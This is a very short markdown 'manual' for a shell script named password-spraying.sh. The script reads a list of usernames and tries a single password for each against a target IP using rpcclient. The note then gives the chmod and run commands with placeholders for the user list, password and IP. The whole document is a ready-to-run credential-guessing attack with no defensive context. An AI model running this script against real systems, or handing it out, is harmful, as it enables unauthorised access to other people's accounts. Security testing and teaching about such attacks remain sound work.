# Manual

`$ cat password-spraying.sh`

---

```bash
#!/bin/sh

for username in `cat $1`
do
    echo -n "[*] user: $username" && rpcclient -U "$username%$2" -c "getusername;quit" $3
done
```

`$ chmod +x password-spraying.sh`

`$ ./password-spraying.sh users.lst <password> <IP>`